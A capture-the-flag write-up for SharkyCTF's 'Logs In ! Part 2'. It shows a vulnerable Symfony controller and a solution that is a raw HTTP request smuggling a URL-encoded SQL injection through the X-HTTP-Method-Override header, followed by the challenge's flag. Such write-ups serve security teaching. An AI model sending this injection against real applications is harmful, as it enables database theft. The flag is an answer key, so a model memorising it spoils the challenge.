# Logs In ! Part 2

## Description

Whaaaat? They did not closed the dev mode? Seriously? Whatever, you couldn't access our sensible database, I guess an open dev application couldn't give that much information or hurt us could it?

The application is hosted at logs_in

Creator : Remsio


Vulnerable code:

```
/**
     * @Route("/e48e13207341b6bffb7fb1622282247b")
     * @return Response
     */
    public function admin(KernelInterface $kernel)
    {
        $url = 'http://10.0.142.5'; // IP de l'API
        $call_api = new CallAPI();
        $request = new Request(
           $_GET,
           $_POST,
           [],
           $_COOKIE,
           $_FILES,
           $_SERVER
       );
       $method = $request->getMethod();
        $get_data = $call_api->callAPI('GET', $url.'?method='.$request->getMethod(), false);
        $response = $get_data;
        return $this->render('main/admin.html.twig', ['response' => json_decode($response), 'method' => $method]);
    } 
```

## Solution

```
POST /e48e13207341b6bffb7fb1622282247b HTTP/1.1
Host: logs_in.sharkyctf.xyz
X-HTTP-Method-Override: 123'+UNION+SELECT+null,flag,null+FROM+`%69%74%5f%73%65%65%6d%73%5f%73%65%63%72%65%74`+--+-

```

```
shkCTF{CVE-2019-10913_S33m3D_Bulls5H1T_B3F0R3_TH15_Ch4LL_69e28c7b0004fe05b05800596e64343b}
```